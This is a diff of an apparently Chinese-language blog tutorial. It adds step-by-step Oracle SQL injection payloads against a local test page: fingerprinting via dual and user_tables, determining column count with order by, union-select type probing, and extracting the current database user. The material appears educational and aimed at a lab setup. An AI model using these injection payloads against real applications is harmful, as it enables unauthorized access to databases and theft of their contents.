@@ -181,6 +181,21 @@
 <p>也可以通过dual来判断是否为oracle ：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;1 --</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/06/23/oracle/image-20210426172344519.jpg" alt="image-20210426172344519.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;0 --</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/23/oracle/image-20210426172401354.jpg" alt="image-20210426172401354"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=1&#39;">http://127.0.0.1/oracle.php?id=1&#39;</a> and (select count (*) from user_tables)&gt;0–<br><img src="/2021/06/23/oracle/image-20210426172624271.jpg" alt="image-20210426172624271"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=1&#39;">http://127.0.0.1/oracle.php?id=1&#39;</a> and (select count(*) from all_objects)&gt;0–<br><img src="/2021/06/23/oracle/image-20210429112503098.jpg" alt="image-20210429112503098"></p>
+<p>也可以利用：单引号双位数=正确，单引号单位数=错误  的规则。</p>
+<h2 id="联合注入步骤"><a href="#联合注入步骤" class="headerlink" title="联合注入步骤"></a>联合注入步骤</h2><p><img src="/2021/06/23/oracle/image-20210426173217803.jpg" alt="image-20210426173217803"></p>
+<p>判断闭合，和mysql一样，此处判断为单引号闭合：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=1&#39;--">http://127.0.0.1/oracle.php?id=1&#39;--</a><br><img src="/2021/06/23/oracle/image-20210426173202544.jpg" alt="image-20210426173202544"></p>
+<p>判断字段数：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=1&#39;">http://127.0.0.1/oracle.php?id=1&#39;</a> order by 4 –<br><img src="/2021/06/23/oracle/image-20210426173315079.jpg" alt="image-20210426173315079"></p>
+<p>判断联合注入：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=-1&#39;">http://127.0.0.1/oracle.php?id=-1&#39;</a> union select null,null,null,null from dual–<br><img src="/2021/06/23/oracle/image-20210426173439832.jpg" alt="image-20210426173439832"></p>
+<p>判断每个字段的数据类型：</p>
+<p>第1个字段为数字型：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=-1&#39;">http://127.0.0.1/oracle.php?id=-1&#39;</a> union select 1,null,null,null from dual–<br><img src="/2021/06/23/oracle/image-20210426173644888.jpg" alt="image-20210426173644888"></p>
+<p>继续判断第2个字段的数据类型：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=-1&#39;">http://127.0.0.1/oracle.php?id=-1&#39;</a> union select 1,2,null,null from dual–<br><img src="/2021/06/23/oracle/image-20210426173722211.jpg" alt="image-20210426173722211"></p>
+<p>结合上图可以判断出第2个字段为字符串类型：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=-1&#39;">http://127.0.0.1/oracle.php?id=-1&#39;</a> union select 1,’2’,null,null from dual–<br><img src="/2021/06/23/oracle/image-20210426173823520.jpg" alt="image-20210426173823520"></p>
+<p>然后就可以以此类推来判断后面每个字段的数据类型了，这里就不再重复了。。最终判断的结果为：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=-1&#39;">http://127.0.0.1/oracle.php?id=-1&#39;</a> union select 1,’2’,’3’,’4’ from dual–<br><img src="/2021/06/23/oracle/image-20210426174000425.jpg" alt="image-20210426174000425"></p>
+<p>判断当前数据库的用户：<a target="_blank" rel="noopener" href="http://127.0.0.1/oracle.php?id=-1&#39;">http://127.0.0.1/oracle.php?id=-1&#39;</a> union select 1,(select sys_context(‘userenv’,’current_user’) from dual),null,null from dual–<br><img src="/2021/06/23/oracle/image-20210427100035497.jpg" alt="image-20210427100035497"></p>
 
       
 
